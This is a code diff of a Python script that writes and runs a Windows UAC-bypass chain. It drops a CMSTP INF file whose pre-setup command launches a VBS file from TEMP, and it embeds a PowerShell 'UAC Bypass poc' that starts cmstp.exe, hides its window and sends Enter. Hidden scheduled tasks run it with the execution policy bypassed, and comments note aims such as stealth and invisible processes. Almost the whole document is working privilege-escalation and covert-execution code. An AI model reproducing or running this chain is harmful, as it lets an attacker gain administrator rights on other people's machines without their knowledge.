@@ -2,7 +2,6 @@ import os
 import subprocess
 import time
 import sys
-from datetime import datetime, timedelta
 
 def run_command(command, wait=True):
     result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -13,29 +12,30 @@ def run_command(command, wait=True):
 def create_inf_file():
     temp_folder = os.getenv('TEMP')
     inf_content = f"""
-[version]
-Signature="$Windows NT$"
-AdvancedINF=2.5
+    [version]
+    Signature="$Windows NT$"
+    AdvancedINF=2.5
 
-[DefaultInstall]
-CustomDestination=CustInstDestSectionAllUsers
-RunPreSetupCommands=RunPreSetupCommandsSection
+    [DefaultInstall]
+    CustomDestination=CustInstDestSectionAllUsers
+    RunPreSetupCommands=RunPreSetupCommandsSection
 
-[RunPreSetupCommandsSection]
-; Commands to run before setup begins
-taskkill /IM cmstp.exe /F
-cmd /c start {temp_folder}\\ddd.vbs
+    [RunPreSetupCommandsSection]
+    ; Commands to run before setup begins
+    taskkill /IM cmstp.exe /F
+    cmd /c start {temp_folder}\\ddd.vbs
 
-[CustInstDestSectionAllUsers]
-49000,49001=AllUser_LDIDSection,7
+    [CustInstDestSectionAllUsers]
+    49000,49001=AllUser_LDIDSection,7
 
-[AllUser_LDIDSection]
-"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+    [AllUser_LDIDSection]
+    "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
 
-[Strings]
-ServiceName="CorpVPN"
-ShortSvcName="CorpVPN"
-"""
+    [Strings]
+    ServiceName="CorpVPN"
+    ShortSvcName="CorpVPN"
+    """
+
     inf_file_path = os.path.join(temp_folder, 'corpvpn.inf')
     with open(inf_file_path, 'w') as f:
         f.write(inf_content)
@@ -45,48 +45,87 @@ ShortSvcName="CorpVPN"
 def create_a_ps1():
     ps_code = '''
 # UAC Bypass poc using SendKeys
+# Version 1.0
+# Author: Oddvar Moe
+# Functions borrowed from: https://powershell.org/forums/topic/sendkeys/
+# Todo: Hide window on screen for stealth
+# Todo: Make script edit the INF file for command to inject...
+
+# Point this to your INF file containing your juicy commands...
 $InfFile = "$env:TEMP\\corpvpn.inf"
 
 Function Get-Hwnd {
-    Param([string] $ProcessName)
-    Try {
-        $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
-    } Catch {
-        $hwnd = $null
+    [CmdletBinding()]
+    Param (
+        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
+        [string] $ProcessName
+    )
+    Process {
+        $ErrorActionPreference = 'Stop'
+        Try {
+            $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
+        } Catch {
+            $hwnd = $null
+        }
+        $hash = @{
+            ProcessName = $ProcessName
+            Hwnd        = $hwnd
+        }
+        New-Object -TypeName PsObject -Property $hash
     }
-    return $hwnd
 }
 
 function Set-WindowActive {
-    Param([string] $Name)
-    $memberDefinition = @'
-    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
+    [CmdletBinding()]
+    Param (
+        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
+        [string] $Name
+    )
+    Process {
+        $memberDefinition = @'
+        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
 '@
-    Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
-    $hwnd = Get-Hwnd -ProcessName $Name
-    if ($hwnd) {
-        [User32.Api]::SetForegroundWindow($hwnd)
-        [User32.Api]::ShowWindow($hwnd, 0)
+        Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
+        $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
+        If ($hwnd) {
+            $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
+            [User32.Api]::SetForegroundWindow($hwnd)
+            [User32.Api]::ShowWindow($hwnd, 0)  # Pencereyi gizli hale getirmek için 0 kullanılır
+        } Else {
+            [string] $hwnd = 'N/A'
+        }
+        $hash = @{
+            Process = $Name
+            Hwnd    = $hwnd
+        }
+        New-Object -TypeName PsObject -Property $hash
     }
 }
 
+#Needs Windows forms
 Add-Type -AssemblyName System.Windows.Forms
 
+#Command to run
 $ps = New-Object System.Diagnostics.ProcessStartInfo "c:\\windows\\system32\\cmstp.exe"
 $ps.Arguments = "/au $InfFile"
 $ps.UseShellExecute = $false
-$ps.CreateNoWindow = $true
+$ps.CreateNoWindow = $true  # Bu özellik işlemi görünmez yapar
 
-[System.Diagnostics.Process]::Start($ps) | Out-Null
+#Start it
+[System.Diagnostics.Process]::Start($ps) | Out-Null  # Out-Null ile çıktıyı engelledik
 
 do {
-    Start-Sleep -Milliseconds 200
-} until ((Get-Hwnd "cmstp") -ne $null)
+    # Do nothing until cmstp is an active window
+} until ((Set-WindowActive cmstp).Hwnd -ne 0)
 
-Set-WindowActive "cmstp"
+#Activate window
+Set-WindowActive cmstp
+
+#Send the Enter key
 [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 '''
+
     temp_folder = os.getenv('TEMP')
     a_ps1_path = os.path.join(temp_folder, 'a.ps1')
     with open(a_ps1_path, 'w') as f:
@@ -94,55 +133,55 @@ Set-WindowActive "cmstp"
 
     return a_ps1_path
 
-def create_vbs_launcher(ps1_path):
-    vbs_path = os.path.join(os.getenv('TEMP'), 'run.vbs')
-    with open(vbs_path, 'w') as f:
-        f.write(f'''
-Set objShell = CreateObject("Wscript.Shell")
-objShell.Run "powershell -ExecutionPolicy Bypass -File \"{ps1_path}\"", 0, False
-''')
-    return vbs_path
-
 def main():
-    # 1. Görevleri temizle
+    # Delete old tasks
     run_command('schtasks /delete /tn "InstallRequests" /f')
     run_command('schtasks /delete /tn "RunPowerShellScript" /f')
 
-    # 2. Python var mı kontrol et
-    returncode, _, _ = run_command("python --version")
+    # Check if Python is installed
+    returncode, stdout, stderr = run_command("python --version")
     if returncode != 0:
-        returncode, _, _ = run_command('first.exe /quiet InstallAllUsers=0 PrependPath=1')
+        # Python is not installed. Start Python installation...
+        returncode, stdout, stderr = run_command('first.exe /quiet InstallAllUsers=0 PrependPath=1')
         if returncode != 0:
             sys.exit(1)
+        else:
+            pass
+    else:
+        pass
 
-    # 3. requests modülünü kuracak scripti oluştur
+    # Create and schedule install_requests.py
     temp_dir = os.getenv('TEMP')
     script_path = os.path.join(temp_dir, 'install_requests.py')
     with open(script_path, 'w') as script_file:
         script_file.write("import subprocess\n")
         script_file.write("subprocess.check_call(['python', '-m', 'pip', 'install', 'requests'])\n")
 
-    # 4. Schedule it (gizli gerekmez çünkü pip install zaten arka plan)
-    now = datetime.now() + timedelta(minutes=1)
-    time_str = now.strftime("%H:%M")
-    run_command(f'schtasks /create /tn "InstallRequests" /tr "python {script_path}" /sc once /st {time_str} /f')
+    returncode, stdout, stderr = run_command(f'schtasks /create /tn "InstallRequests" /tr "python {script_path}" /sc once /st 00:00 /f')
+    if returncode != 0:
+        print(f"Failed to create task 'InstallRequests': {stderr}")
+        sys.exit(1)
+
+    # Run the task
     run_command('schtasks /run /tn "InstallRequests"')
+
+    # Wait for task completion or timeout, then clean up
     time.sleep(10)
     os.remove(script_path)
 
-    # 5. INF ve PowerShell dosyasını oluştur
-    inf_file_path = create_inf_file()
+    # Create and schedule PowerShell script
     a_ps1_path = create_a_ps1()
-    vbs_launcher = create_vbs_launcher(a_ps1_path)
+    if os.path.exists(a_ps1_path):
+        returncode, stdout, stderr = run_command(f'schtasks /create /tn "RunPowerShellScript" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File {a_ps1_path}" /sc once /st 00:00 /f')
+        if returncode != 0:
+            print(f"Failed to create task 'RunPowerShellScript': {stderr}")
+            sys.exit(1)
+        run_command('schtasks /run /tn "RunPowerShellScript"')
+    else:
+        print("PowerShell script file does not exist.")
 
-    # 6. Tamamen sessiz PowerShell script çalıştırmak için VBS kullan
-    future_time = (datetime.now() + timedelta(minutes=2)).strftime("%H:%M")
-    resultcode, out, err = run_command(f'schtasks /create /tn "RunPowerShellScript" /tr "wscript.exe //B //Nologo {vbs_launcher}" /sc once /st {future_time} /f')
-    if resultcode != 0:
-        print(f"Task creation failed: {err}")
-        sys.exit(1)
-
-    run_command('schtasks /run /tn "RunPowerShellScript"')
+    # Create INF file if necessary
+    inf_file_path = create_inf_file()
 
 if __name__ == "__main__":
     main()
